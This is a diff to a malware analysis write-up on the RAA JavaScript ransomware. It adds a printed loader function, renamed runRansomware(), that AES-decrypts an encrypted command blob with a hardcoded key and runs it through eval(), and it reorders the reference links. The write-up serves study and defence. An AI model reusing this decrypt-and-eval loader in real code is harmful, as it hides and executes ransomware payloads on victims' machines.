@@ -127,22 +127,33 @@ WScriptShellObj.Run(run);
 ( reference: https://msdn.microsoft.com/en-us/library/d5fk67ky(v=vs.84).aspx )
 
 
--- TBD --
+Next function is ** NWvQtGjjfQX()** ,I changed its name to runRansomware():
 
-Next function is ** NWvQtGjjfQX()** which I've named runRansomware().
+```javascript
+function runRansomware() {
+    var data_pn = "TVrDiQNMSFE(...)QQURE";
+
+    var cmd = "U2FsdGVkX1/LHQl+aIAo/hXHDEI5YmZZtBIcL5LHq7o+NZyTxtiLAxCsucmN0NBq12nnNJ7XOCyeXqF9xLAkahyIcXx5oc/ic5FRpoj+tZ1qywTZNhPWMlRllGn8O8viVnpXMYHoJr/AphGHfaAOkX8xYjuWhZE8qw1Qw1vQbqdbMlv5RL3xTETBgbylCgyGER91Kef4Q/2YtokOqzg+0BZIjKpdIbr1jQdh8uwp9MKd+Y9dSm1Lz9dl82QJVVbFiBj7N6MEDCw5JESVi5HilHWFEb3eyacdJBxYtKutbAZBOl6aJrLyxKtlxm4o9Cie5+vIPgMtqHEmBWp9GaqYDQlxXXOuTeysry1LXQiCGP7msk2hqAOEhyfxchlAQuma4twTFqHOrPZDECk8hfVJkBvUZg/hl+y4gKbBBLVDEIlKW9AstpcAP6FOcTt/bsS+0fvHnl1fAtMB1AsBSHKhZX/6eMPBGQBQT5fqvyy8MLyMgLOsCt5XHyEgc2ecU1fDokpzzMxMqIPwFZoQDOZSg/pBOMVTyUHuv18WdWI+Q6lppzIUv4mvxEioH7SROiDFqJoHR4EwIdDO0QR82Q4RTTIWO9CfXkC5VnXlEncsU45rIzfEMDv4r1aqoYQlgFr6xjas0/e7+EVCoxhsp4C2Jta43NmC6uLnhjcWRdCcB/8=";
+    var key_cmd = "2c025c0a1a45d1f18df9ca3514babdbc";
+    var dec_cmd = CryptoJS.AES.decrypt(cmd, key_cmd);
+    dec_cmd = CryptoJS.enc.Utf8.stringify(dec_cmd);
+    eval(dec_cmd);
+    return 0;
+}
+```
+
+This function executes code, which is decrypted from **data_pn** and **cmd** with **key_cmd** key.
 
 
 
 ## Links, references
 
-**News about RAA from BleepingComputer website**
-
-http://www.bleepingcomputer.com/news/security/the-new-raa-ransomware-is-created-entirely-using-javascript/
-
-**malwr.com**
-
-https://malwr.com/analysis/YmE4MDNlMzk2MjY3NDdlYWE1NzFiOTNlYzVhZTlkM2Y/
-
 
 **SophosLabs blog**			
 https://nakedsecurity.sophos.com/2016/06/20/ransomware-thats-100-pure-javascript-no-download-required/
+
+**malwr.com**
+https://malwr.com/analysis/YmE4MDNlMzk2MjY3NDdlYWE1NzFiOTNlYzVhZTlkM2Y/
+
+**RAA – An entirely new JS ransomware delivering Pony malware**
+https://reaqta.com/2016/06/raa-ransomware-delivering-pony/
